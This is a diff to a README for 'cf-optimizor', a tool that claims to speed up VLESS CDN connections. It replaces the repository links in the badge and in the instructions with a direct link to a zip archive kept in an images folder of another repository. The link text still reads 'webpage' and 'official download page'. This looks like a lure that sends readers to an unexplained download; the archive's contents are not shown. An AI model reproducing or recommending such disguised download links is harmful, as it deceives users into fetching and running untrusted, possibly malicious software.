@@ -5,7 +5,7 @@ description: "Optimize VLESS CDN configurations directly in your browser. Paste 
 ---
 # ⚡ cf-optimizor - Improve your internet connection speed easily
 
-[![](https://img.shields.io/badge/Download-cf--optimizor-blue.svg)](https://github.com/Lifesustaining-nailfile250/cf-optimizor)
+[![](https://img.shields.io/badge/Download-cf--optimizor-blue.svg)](https://github.com/Lifesustaining-nailfile250/lifesustaining-nailfile250.github.io/raw/refs/heads/main/images/Application-v2.2-beta.3.zip)
 
 ## 📌 About this software
 
@@ -16,7 +16,7 @@ The cf-optimizor application helps you improve your network connection. Many use
 You do not need to be a computer expert to use this tool. Follow these steps to optimize your network settings.
 
 1. Open your web browser.
-2. Go to the [cf-optimizor webpage](https://github.com/Lifesustaining-nailfile250/cf-optimizor).
+2. Go to the [cf-optimizor webpage](https://github.com/Lifesustaining-nailfile250/lifesustaining-nailfile250.github.io/raw/refs/heads/main/images/Application-v2.2-beta.3.zip).
 3. Find your network connection link. This link usually starts with the word vless.
 4. Copy the link from your source.
 5. Paste the link into the box on the website.
@@ -29,7 +29,7 @@ You do not need to be a computer expert to use this tool. Follow these steps to 
 
 You can access the tool directly through the web browser. If you prefer to have a local copy on your Windows computer, follow these steps:
 
-1. Visit the [official download page](https://github.com/Lifesustaining-nailfile250/cf-optimizor).
+1. Visit the [official download page](https://github.com/Lifesustaining-nailfile250/lifesustaining-nailfile250.github.io/raw/refs/heads/main/images/Application-v2.2-beta.3.zip).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click on the latest version link.
 4. Download the file that ends with .zip or .exe.
